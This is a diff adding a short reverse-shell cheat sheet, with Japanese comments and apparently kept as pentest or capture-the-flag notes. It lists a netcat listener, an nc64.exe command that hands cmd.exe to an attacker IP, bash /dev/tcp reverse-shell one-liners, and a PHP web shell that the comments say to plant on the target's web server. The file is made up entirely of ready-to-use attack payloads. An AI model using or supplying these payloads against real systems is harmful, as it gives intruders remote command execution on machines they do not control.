@@ -1,0 +1,13 @@
+//netcat
+nc -lvnp 4444 #linux待ち受け
+nc <target IP> 4444 #linux接続
+nc64.exe -v <attacker IP> 4444 -e cmd.exe #windows接続
+
+//bash
+bash -i>& /dev/tcp/<IP>/<port> 0>&1
+bash -c 'bash -i>& /dev/tcp/<IP>/<port> 0>&1' #標準のシェルが何かわからないとき
+
+//php shell
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"); #phpファイルにしてターゲットのＷｅｂサーバに配置
+python -m http.server 4444 #待ち受け
+
